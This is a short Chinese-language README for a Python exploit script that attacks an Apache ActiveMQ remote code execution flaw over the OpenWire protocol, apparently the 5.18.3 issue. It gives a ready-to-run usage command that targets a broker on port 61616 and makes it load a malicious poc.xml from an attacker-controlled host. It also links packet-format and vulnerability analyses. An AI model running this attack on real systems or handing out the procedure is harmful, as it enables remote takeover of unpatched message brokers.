# 项目参考

本项目是参考https://github.com/X1r0z/ActiveMQ-RCE师傅的exp来重写的一个python的exp。感谢X1r0z师傅的提供的思路。

# 用法

```shell
python attack.py -u 192.168.163.129 -x http://192.168.163.133:10001/poc.xml -p 61616
```

其中 `-p` 参数默认为 `activeMQ` 的默认端口。`-x` 参数注意需要加上协议的前缀。

# 介绍

这里附上openwire协议的图示就很明白了。
下面给出的是Throwable类型的数据包格式。
![](imgs/1699429752916.png)

具体的漏洞分析见下面的参考文章。

# 参考文章

```
# openwire协议的分析
https://github.com/X1r0z
https://activemq.apache.org/openwire-version-2-specification
# CVE漏洞原理的分析
https://exp10it.cn/2023/10/apache-activemq-%E7%89%88%E6%9C%AC-5.18.3-rce-%E5%88%86%E6%9E%90/
```